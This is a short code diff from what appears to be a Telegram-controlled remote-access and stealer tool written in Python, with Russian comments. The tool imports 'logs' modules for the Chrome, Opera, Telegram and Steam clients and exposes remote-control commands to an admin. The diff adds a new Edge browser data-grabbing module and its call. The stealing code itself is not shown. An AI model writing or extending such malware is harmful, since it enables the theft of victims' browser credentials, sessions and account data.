@@ -15,6 +15,7 @@ from logs.chrome import * # Импортируем логи хрома
 from logs.opera import * # Импортируем логи оперы
 from logs.telegram import * # Импортируем логи телеграма
 from logs.steam import * # Импортируем логи стима
+from logs.Edge import *
 # ---- Imports ---- #
 
 bot = Bot(token=token) # Переменная bot которая содержит в себе токен бота
@@ -85,6 +86,7 @@ while True: # Цикл
         DVDClose(dp, bot, admin_id)
         Rotate(dp, bot, admin_id)
         WriteText(dp, bot, admin_id)
+        Edge(dp, bot, admin_id)
         # ---- Инициализация функционала ---- #
 
         @dp.message_handler(commands=['help']) # Команда /help
